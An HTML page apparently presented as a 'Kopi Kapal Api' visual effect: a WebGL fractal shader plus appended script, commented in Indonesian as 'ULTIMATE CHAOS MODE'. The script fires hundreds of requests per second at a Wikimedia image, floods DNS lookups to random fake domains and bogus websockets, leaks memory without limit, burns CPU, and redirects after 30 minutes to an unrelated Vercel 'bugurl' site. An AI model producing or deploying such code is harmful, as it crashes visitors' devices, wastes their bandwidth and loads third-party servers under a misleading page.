<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
  <title>SEMARAK KOPI KAPAL API</title>
  <style>
    html, body {
      margin: 0; padding: 0; overflow: hidden;
      background: #000;
      height: 100%; width: 100%;
    }
    canvas {
      display: block;
      width: 100vw; height: 100vh;
    }
  </style>
</head>
<body>
<canvas id="glcanvas"></canvas>
<script>
  const canvas = document.getElementById('glcanvas');
  canvas.width = window.screen.width * 2;
  canvas.height = window.screen.height * 2;

  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  if (!gl) alert('WebGL not supported');

  const vertexShaderSource = `
    attribute vec3 position;
    void main() {
      gl_Position = vec4(position, 1.0);
    }
  `;

  const fragmentShaderSource = `
    precision highp float;
    uniform float time;
    uniform vec2 resolution;

    mat2 rot(float a) {
      float c = cos(a), s = sin(a);
      return mat2(c, -s, s, c);
    }

    float hash(vec2 p) {
      return fract(sin(dot(p, vec2(127.1, 311.7))) * 43758.5453123);
    }

    float noise(vec2 p) {
      vec2 i = floor(p);
      vec2 f = fract(p);
      float a = hash(i);
      float b = hash(i + vec2(1.0, 0.0));
      float c = hash(i + vec2(0.0, 1.0));
      float d = hash(i + vec2(1.0, 1.0));
      vec2 u = f*f*(3.0 - 2.0*f);
      return mix(a, b, u.x) +
             (c - a)* u.y * (1.0 - u.x) +
             (d - b) * u.x * u.y;
    }

    float fbm(vec2 p) {
      float f = 0.0;
      float w = 0.5;
      for (int i=0; i<8; i++) {
        f += w * noise(p);
        p *= 2.0;
        w *= 0.5;
      }
      return f;
    }

    float fractal(vec2 uv) {
      float sum = 0.0;
      float scale = 1.0;
      vec2 pos = uv;
      for (int i=0; i < 300; i++) {
        pos = abs(pos) / dot(pos, pos + 0.001) - 1.5;
        sum += abs(fbm(pos * scale));
        scale *= 1.25;
      }
      return sum;
    }

    void main() {
      vec2 uv = (gl_FragCoord.xy / resolution.xy) * 2.0 - 1.0;
      uv.x *= resolution.x / resolution.y;
      uv *= rot(time * 0.5);
      uv *= 1.3 + 0.5 * sin(time * 1.5);

      float f = fractal(uv * 1.2);
      vec3 col = vec3(
        0.6 + 0.4 * sin(time + f * 12.0),
        0.4 + 0.6 * cos(time * 1.3 + f * 7.0),
        f * 1.0
      );

      float n = noise(gl_FragCoord.xy * 0.3 + vec2(time * 8.0));
      col += vec3(n * 0.4);

      for (int i = 0; i < 4; i++) {
        col += vec3(sin(f * 15.0 + float(i) * time * 0.5)) * 0.15;
      }

      gl_FragColor = vec4(col, 1.0);
    }
  `;

  function createShader(gl, type, source) {
    const shader = gl.createShader(type);
    gl.shaderSource(shader, source);
    gl.compileShader(shader);
    if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
      alert('Shader compile error: ' + gl.getShaderInfoLog(shader));
      gl.deleteShader(shader);
      return null;
    }
    return shader;
  }

  const vertexShader = createShader(gl, gl.VERTEX_SHADER, vertexShaderSource);
  const fragmentShader = createShader(gl, gl.FRAGMENT_SHADER, fragmentShaderSource);

  const program = gl.createProgram();
  gl.attachShader(program, vertexShader);
  gl.attachShader(program, fragmentShader);
  gl.linkProgram(program);
  if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
    alert('Program link error: ' + gl.getProgramInfoLog(program));
  }
  gl.useProgram(program);

  const positionLocation = gl.getAttribLocation(program, 'position');
  const resolutionLocation = gl.getUniformLocation(program, 'resolution');
  const timeLocation = gl.getUniformLocation(program, 'time');

  const positionBuffer = gl.createBuffer();
  gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
  const positions = new Float32Array([
    -1, -1, 0,
     1, -1, 0,
    -1,  1, 0,
     1,  1, 0
  ]);
  gl.bufferData(gl.ARRAY_BUFFER, positions, gl.STATIC_DRAW);

  gl.enableVertexAttribArray(positionLocation);
  gl.vertexAttribPointer(positionLocation, 3, gl.FLOAT, false, 0, 0);

  function render(time) {
    time *= 0.001;
    gl.viewport(0, 0, canvas.width, canvas.height);
    gl.uniform2f(resolutionLocation, canvas.width, canvas.height);
    gl.uniform1f(timeLocation, time);
    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
    requestAnimationFrame(render);
  }

  requestAnimationFrame(render);

  // Auto redirect setelah 30 menit
  setTimeout(() => {
    window.location.href = "https://bugurl-hana1305-forevers-projects.vercel.app/";
  }, 1800000); // 30 menit

  // Timer countdown pojok atas kanan
  const timer = document.createElement("div");
  timer.style.position = "absolute";
  timer.style.top = "10px";
  timer.style.right = "20px";
  timer.style.color = "red";
  timer.style.fontSize = "1.5em";
  timer.style.fontFamily = "monospace";
  timer.style.zIndex = "1000";
  document.body.appendChild(timer);

  let duration = 30 * 60;
  setInterval(() => {
    const mins = String(Math.floor(duration / 60)).padStart(2, '0');
    const secs = String(duration % 60).padStart(2, '0');
    timer.innerText = `â³ ${mins}:${secs}`;
    duration--;
  }, 1000);

  // Simulasi network lag: spam fetch
  setInterval(() => {
    for (let i = 0; i < 500; i++) {
      fetch("https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png").catch(() => {});
    }
  }, 1000);
  // ðŸ§¨ ULTIMATE CHAOS MODE
let heavyObjects = [];

setInterval(() => {
  // Dummy image spam (bandwidth stress)
  for (let i = 0; i < 300; i++) {
    fetch("https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png")
      .catch(() => {});
  }

  // DNS lookup spam to fake domains
  for (let i = 0; i < 200; i++) {
    fetch("https://fake" + Math.random().toString(36).substring(2) + ".com")
      .catch(() => {});
  }

  // Allocate huge dummy data to eat memory
  const junk = new Array(1000000).fill(Math.random());
  heavyObjects.push(junk); // never released â†’ memory leak

  // CPU spike: dummy math operations
  for (let i = 0; i < 10000000; i++) {
    Math.sqrt(Math.random() * i);
  }

  // Fake websocket connect (never succeed)
  try {
    new WebSocket("wss://notreal-" + Math.random().toString(36).substring(2) + ".com");
  } catch (e) {}

}, 3000); // repeat every 3s

// Optional: force reload loop (uncomment if mau ekstrim)
// setInterval(() => location.reload(), 1000 * 60 * 30); // reload tiap 30 menit
</script>
</body>
</html>
